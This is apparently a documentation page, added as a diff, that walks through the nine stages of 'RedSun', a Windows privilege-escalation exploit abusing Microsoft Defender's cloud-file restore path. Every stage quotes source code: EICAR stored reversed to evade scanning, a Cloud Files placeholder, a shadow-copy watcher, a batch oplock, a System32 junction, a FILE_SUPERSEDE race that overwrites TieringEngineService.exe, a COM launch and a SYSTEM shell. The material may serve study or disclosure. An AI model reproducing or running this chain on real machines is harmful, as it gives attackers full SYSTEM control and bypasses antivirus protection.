@@ -1,0 +1,214 @@
+---
+title: "How RedSun works: the complete exploit chain walkthrough"
+description: "A plain-English walkthrough of every stage in the RedSun exploit — from EICAR string to interactive SYSTEM shell — with source code references."
+---
+
+RedSun chains together nine discrete stages, each one handing off to the next with precise timing. The core trick is straightforward: write a file Defender will want to restore, then manipulate the filesystem so that restoration lands in `System32` instead of the original path. Everything else — the Cloud Files placeholder, the VSS watcher, the batch oplock, the directory junction — exists to set up that one pivotal write at the right moment.
+
+<Info>
+  All source references below point to `RedSun.cpp` in the project repository. Line numbers are provided for each relevant snippet.
+</Info>
+
+## The exploit chain
+
+<Steps>
+
+  <Step title="Write the EICAR test string">
+    The exploit needs Defender to scan and flag a file. It writes the standard EICAR antimalware test string — but stores it reversed in the source to avoid triggering static analysis of the PoC itself:
+
+    ```cpp
+    // RedSun.cpp:621-624
+    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
+    rev(eicar);
+    DWORD nwf = 0;
+    WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
+    ```
+
+    The `rev()` function (line 427) is a simple in-place string reversal. After the call, `eicar` holds the real EICAR signature. The file is written to a GUID-named subdirectory under `%TEMP%` as `TieringEngineService.exe`.
+
+    A second `CreateFile` with `FILE_EXECUTE` access (line 627) then nudges Defender into scanning the file immediately.
+  </Step>
+
+  <Step title="DoCloudStuff() — register a Cloud Files sync root and create a placeholder">
+    With the EICAR file written and scanned, the exploit registers the working directory as a Cloud Files sync root, then turns the file into an in-sync cloud placeholder:
+
+    ```cpp
+    // RedSun.cpp:463,474,500,503
+    HRESULT hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy,
+        CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
+    // ...
+    hs = CfConnectSyncRoot(syncroot, callbackreg, callbackctx,
+        CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
+    // ...
+    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE
+                         | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
+    hs = CfCreatePlaceholders(syncroot, placeholder, 1,
+        CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
+    ```
+
+    The `CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC` flag tells Windows this file is already synchronized with the cloud. When Defender later tries to restore it, this tag is what triggers the unusual rewrite-to-original-path behaviour instead of a normal deletion.
+
+    <Note>
+      The provider name is set to `L"SERIOUSLYMSFT"` — a comment in the source reads: "let's see how long you can play this game, I'm willing to go as far as you want."
+    </Note>
+  </Step>
+
+  <Step title="ShadowCopyFinderThread() — watch for a new VSS volume">
+    A background thread opens the `\Device` object manager directory and polls it with `NtQueryDirectoryObject`, looking for a `HarddiskVolumeShadowCopy` device that was not present when the thread started:
+
+    ```cpp
+    // RedSun.cpp:260-267
+    wchar_t devicepath[] = L"\\Device";
+    UNICODE_STRING udevpath = { 0 };
+    RtlInitUnicodeString(&udevpath, devicepath);
+    OBJECT_ATTRIBUTES objattr = { 0 };
+    InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    HANDLE hobjdir = NULL;
+    stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
+    ```
+
+    When Defender's cloud-file remediation path runs, it creates a Volume Shadow Copy (VSS snapshot) of the affected volume. The thread detects this new shadow copy device and opens the corresponding path to the flagged file inside the snapshot.
+  </Step>
+
+  <Step title="Batch oplock on the VSS copy — intercept Defender's restore">
+    Once the shadow copy file is open, the thread places a batch oplock on it:
+
+    ```cpp
+    // RedSun.cpp:401-413
+    OVERLAPPED ovd = { 0 };
+    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
+    // ...
+    SetEvent(gevent);          // signal main thread: VSS copy found
+    ResetEvent(gevent);
+    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);  // wait for oplock break
+    WaitForSingleObject(gevent, INFINITE);           // wait for main thread's signal
+    ```
+
+    The oplock break fires when Defender opens the VSS copy to read the file contents for restoration. This break is the synchronization point: it pauses Defender mid-restore while the main thread reconfigures the filesystem.
+  </Step>
+
+  <Step title="Named pipe REDSUN — session-ID carrier">
+    Before any of the above, `main()` creates a named pipe that will survive until the SYSTEM payload runs:
+
+    ```cpp
+    // RedSun.cpp:591
+    HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN",
+        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
+        NULL, 1, NULL, NULL, NULL, NULL);
+    ```
+
+    When `TieringEngineService.exe` (the replaced binary, now running as SYSTEM) later calls `LaunchConsoleInSessionId()`, it opens this pipe and calls `GetNamedPipeServerSessionId()` to discover which session the original low-privilege user is in. This is how the spawned `conhost.exe` ends up in the right desktop session.
+  </Step>
+
+  <Step title="Set a directory reparse point to System32">
+    While the oplock is holding Defender's restore thread, the main thread renames the working directory aside, re-creates it as an empty directory, and sets a mount-point reparse point on it targeting `\??\C:\Windows\System32`:
+
+    ```cpp
+    // RedSun.cpp:713-728
+    wchar_t rptarget[] = { L"\\??\\C:\\Windows\\System32" };
+    // ...
+    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
+    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
+    // ...
+    DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
+    ```
+
+    From this moment, any path that resolves through the working directory will be redirected into `System32`. The directory is also opened with `FILE_DELETE_ON_CLOSE` so it cleans itself up.
+  </Step>
+
+  <Step title="NtCreateFile FILE_SUPERSEDE race — write TieringEngineService.exe">
+    The main thread signals the shadow-copy thread (releasing the oplock) and simultaneously races to write `TieringEngineService.exe` via the junction:
+
+    ```cpp
+    // RedSun.cpp:742-752
+    wchar_t malpath[] = { L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe" };
+    // ...
+    for (int i = 0; i < 1000; i++)
+    {
+        stat = NtCreateFile(&hlk, GENERIC_WRITE, &objattr2, &iostat, NULL, NULL,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            FILE_SUPERSEDE, NULL, NULL, NULL);
+        if (!stat)
+            break;
+        Sleep(20);
+    }
+    ```
+
+    `FILE_SUPERSEDE` replaces the file if it exists. The loop retries up to 1,000 times at 20 ms intervals to win the race against Defender completing its restore. When the loop exits with `STATUS_SUCCESS`, the PoC binary has been written to `System32\TieringEngineService.exe` by the SYSTEM-level Defender restore path.
+
+    The success message is printed: `"The red sun shall prevail."`
+  </Step>
+
+  <Step title="LaunchTierManagementEng() — instantiate the COM server">
+    With the replaced binary in place, the exploit uses COM to start the Storage Tiers Management engine, which will load and run the binary as SYSTEM:
+
+    ```cpp
+    // RedSun.cpp:578-587
+    void LaunchTierManagementEng()
+    {
+        CoInitialize(NULL);
+        GUID guidObject = { 0x50d185b9,0xfff3,0x4656,{0x92,0xc7,0xe4,0x01,0x8d,0xa4,0x36,0x1d} };
+        void* ret = NULL;
+        HRESULT hr = CoCreateInstance(guidObject, NULL, CLSCTX_LOCAL_SERVER, guidObject, &ret);
+        CoUninitialize();
+    }
+    ```
+
+    The GUID `50d185b9-fff3-4656-92c7-e4018da4361d` is the Storage Tiers Management COM class. `CLSCTX_LOCAL_SERVER` causes Windows to launch the registered server executable — now the attacker-controlled binary in `System32` — as a separate process under a privileged service account.
+  </Step>
+
+  <Step title="IsRunningAsLocalSystem() + LaunchConsoleInSessionId() — deliver the shell">
+    The PoC binary checks on startup whether it is already running as `NT AUTHORITY\SYSTEM`. If it is, it reads the session ID from the `\\pipe\\REDSUN` named pipe and spawns `conhost.exe` in that session:
+
+    ```cpp
+    // RedSun.cpp:555-575
+    bool IsRunningAsLocalSystem()
+    {
+        // ...
+        bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
+        if (ret) {
+            LaunchConsoleInSessionId();
+            ExitProcess(0);
+        }
+        return ret;
+    }
+    bool r = IsRunningAsLocalSystem();  // called at static init time
+
+    // RedSun.cpp:541-543
+    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe",
+        NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+    ```
+
+    Because `IsRunningAsLocalSystem()` runs at static initialization (before `main()`), it triggers immediately when the COM server loads the binary. The token is duplicated, its session ID is patched to match the original user's desktop session, and `CreateProcessAsUser` delivers an interactive `SYSTEM` shell to the attacker's console.
+  </Step>
+
+</Steps>
+
+## Key Windows APIs used
+
+| API / Control code | Class / flag | Purpose in RedSun |
+|---|---|---|
+| `NtCreateFile` | `FILE_SUPERSEDE` | Race-write `TieringEngineService.exe` through the junction into `System32` |
+| `NtSetInformationFile` | `FileDispositionInformationEx` (class 64) | Mark the working file for deletion on close |
+| `NtSetInformationFile` | `FileRenameInformation` (class 10) | Rename the working file before re-creating the directory as a junction |
+| `FSCTL_REQUEST_BATCH_OPLOCK` | — | Hold Defender's restore thread while the junction is being set up |
+| `FSCTL_SET_REPARSE_POINT` | `IO_REPARSE_TAG_MOUNT_POINT` | Redirect the working directory to `\??\C:\Windows\System32` |
+| `CfRegisterSyncRoot` | `CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT` | Register the temp directory as a Cloud Files sync root |
+| `CfConnectSyncRoot` | `CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO` | Connect to the sync root so placeholders can be created |
+| `CfCreatePlaceholders` | `CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC` | Tag the EICAR file as an in-sync cloud placeholder to trigger Defender's restore path |
+| `NtQueryDirectoryObject` | — | Poll the `\Device` object directory for new `HarddiskVolumeShadowCopy` volumes |
+| `CoCreateInstance` | `CLSCTX_LOCAL_SERVER` | Launch the replaced `TieringEngineService.exe` binary via COM as a privileged process |
+
+<AccordionGroup>
+  <Accordion title="Why does Defender restore the file instead of deleting it?">
+    When Defender detects a malicious file that is also a Cloud Files placeholder marked `CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC`, its remediation path attempts to restore the file from the cloud (the Volume Shadow Copy acts as the "cloud" source in this context) rather than simply deleting it. This is the fundamental behaviour RedSun exploits: the antivirus confirms the file's presence rather than eliminating it.
+  </Accordion>
+  <Accordion title="Why TieringEngineService.exe?">
+    `TieringEngineService.exe` is the executable registered for the Storage Tiers Management COM server (`50d185b9-fff3-4656-92c7-e4018da4361d`). It runs as a local server, meaning COM will launch it as a new process. By replacing it with the PoC binary, the attacker gets code execution via a COM `CoCreateInstance` call — an unprivileged operation — without needing to interact with the SCM or any privileged API directly.
+  </Accordion>
+  <Accordion title="What prevents Defender from scanning the PoC binary itself?">
+    The EICAR string is stored reversed (`*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$...`) and only reversed in memory at runtime via `rev()`. Static scanners examining the compiled binary will not find the EICAR signature in forward form, so the PoC itself is unlikely to be flagged before it executes.
+  </Accordion>
+</AccordionGroup>
